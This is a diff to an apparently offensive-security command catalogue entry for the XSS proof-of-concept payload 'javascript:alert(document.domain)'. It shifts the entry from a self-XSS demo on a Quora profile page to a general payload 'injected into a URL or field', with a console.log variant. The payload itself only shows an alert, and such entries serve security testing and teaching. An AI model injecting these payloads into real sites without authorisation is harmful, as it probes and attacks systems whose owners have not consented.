@@ -1,16 +1,16 @@
 ---
-id: cmd-uuid-456
-data: 'javascript:alert(document.domain)// https://www.quora.com/profile/Username/'
+data: 'javascript:alert(document.domain)'
 tags:
   - xss
-  - self-xss
+  - payload
 type: command
-output: Alert popup displaying 'www.quora.com'
-executor: browser
+output: 'Browser alert box showing the domain (e.g., localhost)'
+executor: javascript
 platforms:
   - Web
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:16:25.027Z'
+updated_at: '2025-12-14T17:29:20.259Z'
+id: 0b73a4f5-8548-44c3-9cd6-4ab128dbe062
 verified: false
 validated: true
 submitted: true
@@ -20,42 +20,42 @@ submitted: true
 ## Command
 
 ```javascript
-javascript:alert(document.domain)// https://www.quora.com/profile/Username/
+javascript:alert(document.domain)
 ```
 
 ## Description
 
-This browser-executed command uses the javascript: protocol to run an alert displaying the current document's domain when pasted into the address bar on a Quora profile page, demonstrating self-XSS in the user's session.
+This JavaScript payload uses the javascript: pseudoprotocol to execute an alert displaying the current document domain when triggered in a browser context, useful for demonstrating stored XSS execution and origin confirmation.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| alert(document.domain) | JavaScript code to display the domain in a popup | Yes |
-| // https://www.quora.com/profile/Username/ | Comment appending the profile URL to mimic a legitimate link without affecting execution | No |
+| document.domain | Retrieves the domain of the current page | Yes |
 
 ## Examples
 
 ### Basic Usage
 
-```javascript
-javascript:alert(document.domain)// https://www.quora.com/profile/Username/
-```
+Inject into a URL or field:
 
-Paste into address bar on the profile page to trigger.
+```javascript
+javascript:alert(document.domain)
+```
 
 ### Advanced Usage
 
-```javascript
-javascript:alert('Self-XSS Demo')// https://www.quora.com/profile/Username/
-```
+Combine with other actions:
 
-Customize the alert message for testing.
+```javascript
+javascript:alert(document.domain); console.log('XSS triggered');
+```
 
 ## Expected Output
 
-An alert dialog box pops up showing the domain 'www.quora.com', executed in the context of the Quora page.
+A browser alert dialog appears with the text of the current domain, such as 'localhost', confirming script execution in the target's session.
 
 ## Related
 
-- [[procedures/Execute-Self-XSS-via-Javascript-URL]]
+- [[commands/javascript-alert-document-domain-semicolon]]
+- [[procedures/Inject-XSS-Payloads-into-Domain-Fields]]
